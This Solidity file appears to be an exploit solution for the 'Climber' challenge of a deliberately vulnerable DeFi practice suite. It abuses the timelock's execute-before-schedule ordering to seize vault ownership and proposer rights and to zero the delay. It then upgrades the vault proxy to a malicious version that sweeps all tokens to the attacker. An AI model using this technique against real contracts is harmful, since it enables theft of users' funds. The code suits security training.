// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ClimberVaultV2 is ClimberVault {
    function sweepFunds(address token, address _recovery) external onlyOwner {
        IERC20(token).transfer(_recovery, IERC20(token).balanceOf(address(this)));
    }
}

contract ProposeSchedule {
    ClimberTimelock timelock;
    ClimberVault vault;
    address attack;

    constructor(address _timelock, address _vault, address _attack) {
        timelock = ClimberTimelock(payable(_timelock));
        vault = ClimberVault(_vault);
        attack = _attack;
    }

    function proposeSchedule() external {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        targets[0] = address(vault);
        values[0] = 0;
        dataElements[0] = abi.encodeCall(vault.transferOwnership, (attack));
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(this)));
        targets[2] = address(timelock);
        values[2] = 0;
        dataElements[2] = abi.encodeCall(timelock.updateDelay, (0));
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeCall(ProposeSchedule.proposeSchedule, ());
        timelock.schedule(targets, values, dataElements, 0);
    }
}

contract AttackClimber {
    ClimberTimelock timelock;
    ClimberVault vault;

    constructor(address _timelock, address _vault) {
        timelock = ClimberTimelock(payable(_timelock));
        vault = ClimberVault(_vault);
    }

    function attack(address token, address _recovery) external {
        ProposeSchedule proposeSchedule = new ProposeSchedule(address(timelock), address(vault), address(this));
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        targets[0] = address(vault);
        values[0] = 0;
        dataElements[0] = abi.encodeCall(vault.transferOwnership, (address(this)));
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(proposeSchedule)));
        targets[2] = address(timelock);
        values[2] = 0;
        dataElements[2] = abi.encodeCall(timelock.updateDelay, (0));
        targets[3] = address(proposeSchedule);
        values[3] = 0;
        dataElements[3] = abi.encodeCall(ProposeSchedule.proposeSchedule, ());
        timelock.execute(targets, values, dataElements, 0);
        vault.upgradeToAndCall(address(new ClimberVaultV2()), "");
        ClimberVaultV2(address(vault)).sweepFunds(token, _recovery);
    }
}
